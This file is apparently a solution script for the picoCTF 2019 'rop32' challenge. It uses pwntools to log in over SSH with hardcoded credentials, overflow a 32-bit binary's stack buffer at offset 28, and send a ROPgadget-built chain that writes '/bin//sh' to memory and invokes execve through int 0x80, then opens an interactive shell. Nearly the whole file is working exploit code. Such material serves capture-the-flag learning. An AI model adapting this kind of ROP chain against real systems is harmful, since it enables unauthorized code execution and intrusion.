# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

import os
from pwn import *
from struct import pack

host = '2019shell1.picoctf.com'
user = 'yyymmm'
password = '123'
cwd = '/problems/rop32_1_c4f09c419e5910665553c0237de93dcf'

ssh = ssh(host=host,user=user,password=password)
ssh.set_working_directory(cwd)
s = ssh.process('./vuln',cwd=cwd)

def rop():
    # ROPgadget --binary ./vuln  --ropchain --badbytes 0a
    
    p = 'A'*(28) # overflow offset
    
    p += pack('<I', 0x0806ee6b) # pop edx ; ret
    p += pack('<I', 0x080da060) # @ .data
    p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
    p += '/bin'
    p += pack('<I', 0x080da060) # padding without overwrite edx
    p += pack('<I', 0x41414141) # padding
    p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ee6b) # pop edx ; ret
    p += pack('<I', 0x080da064) # @ .data + 4
    p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
    p += '//sh'
    p += pack('<I', 0x080da064) # padding without overwrite edx
    p += pack('<I', 0x41414141) # padding
    p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ee6b) # pop edx ; ret
    p += pack('<I', 0x080da068) # @ .data + 8
    p += pack('<I', 0x08056420) # xor eax, eax ; ret
    p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080481c9) # pop ebx ; ret
    p += pack('<I', 0x080da060) # @ .data
    p += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
    p += pack('<I', 0x080da068) # @ .data + 8
    p += pack('<I', 0x080da060) # padding without overwrite ebx
    p += pack('<I', 0x0806ee6b) # pop edx ; ret
    p += pack('<I', 0x080da068) # @ .data + 8
    p += pack('<I', 0x08056420) # xor eax, eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x0807c2fa) # inc eax ; ret
    p += pack('<I', 0x08049563) # int 0x80

    return p


payload = rop()
print "payload: ", payload
print s.recvuntil('?')
s.sendline(payload)

s.interactive()
